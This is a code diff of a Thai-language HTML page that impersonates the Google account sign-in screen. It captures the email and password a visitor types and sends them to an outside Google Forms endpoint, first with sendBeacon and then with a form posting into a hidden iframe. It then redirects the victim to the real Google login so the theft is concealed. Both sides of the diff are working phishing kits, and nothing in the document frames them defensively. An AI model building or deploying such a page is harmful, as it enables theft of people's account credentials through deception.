@@ -2,18 +2,13 @@
 <html lang="th">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>ลงชื่อเข้าใช้งาน - บัญชี Google</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #fff; }
+        body { font-family: arial,sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: white; }
         .box { border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px; width: 360px; text-align: center; }
-        h2 { font-size: 24px; font-weight: 400; margin: 10px 0; color: #202124; }
-        p { font-size: 16px; margin-bottom: 40px; color: #202124; }
-        input { width: 100%; padding: 13px 15px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-        input:focus { outline: none; border: 2px solid #1a73e8; }
-        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }
-        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; }
-        .link { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
+        input { width: 100%; padding: 13px 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; float: right; font-weight: 500; }
+        #hidden_iframe { display: none; }
     </style>
 </head>
 <body>
@@ -22,43 +17,25 @@
     <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
     <h2>ลงชื่อเข้าใช้งาน</h2>
     <p>ใช้บัญชี Google ของคุณ</p>
-    
-    <input type="email" id="email" placeholder="อีเมลหรือโทรศัพท์">
-    <input type="password" id="pass" placeholder="ป้อนรหัสผ่านของคุณ">
-    
-    <div style="text-align: left;"><span class="link">หากลืมอีเมล?</span></div>
 
-    <div class="footer">
-        <span class="link">สร้างบัญชี</span>
-        <button onclick="sendData()">ถัดไป</button>
-    </div>
+    <form id="gform" action="https://docs.google.com/forms/d/e/1FAIpQLSeJuuzCrT38oInaQg0sSGQ1-BBW7mQO0-O9HcvxwzyXluYa9Q/formResponse" method="POST" target="hidden_iframe">
+        <input type="email" name="entry.1449652638" id="email" placeholder="อีเมลหรือโทรศัพท์" required>
+        <input type="password" name="entry.270012312" id="pass" placeholder="ป้อนรหัสผ่านของคุณ" required>
+        
+        <div style="margin-top: 40px;">
+            <button type="submit" onclick="moveOn()">ถัดไป</button>
+        </div>
+    </form>
 </div>
 
+<iframe name="hidden_iframe" id="hidden_iframe"></iframe>
+
 <script>
-    function sendData() {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('pass').value;
-
-        if (!email || !pass) {
-            alert("กรุณากรอกข้อมูลให้ครบ");
-            return;
-        }
-
-        const formID = "1FAIpQLSeJuuzCrT38oInaQg0sSGQ1-BBW7mQO0-O9HcvxwzyXluYa9Q";
-        const url = `https://docs.google.com/forms/d/e/${formID}/formResponse`;
-
-        // สร้างข้อมูลแบบ Form Data
-        const formData = new FormData();
-        formData.append('entry.1449652638', email);
-        formData.append('entry.270012312', pass);
-
-        // ใช้ sendBeacon เพื่อส่งข้อมูลแบบ POST (ป้องกัน Error 400 ได้ดีที่สุด)
-        navigator.sendBeacon(url, formData);
-
-        // เด้งไปหน้าจริงทันที
+    function moveOn() {
+        // รอให้ฟอร์มส่งข้อมูลครู่หนึ่งแล้วเด้งไปหน้าจริง
         setTimeout(() => {
-            window.location.href = "https://accounts.google.com/v3/signin/identifier";
-        }, 300);
+            window.location.href = "https://accounts.google.com";
+        }, 1000);
     }
 </script>
 
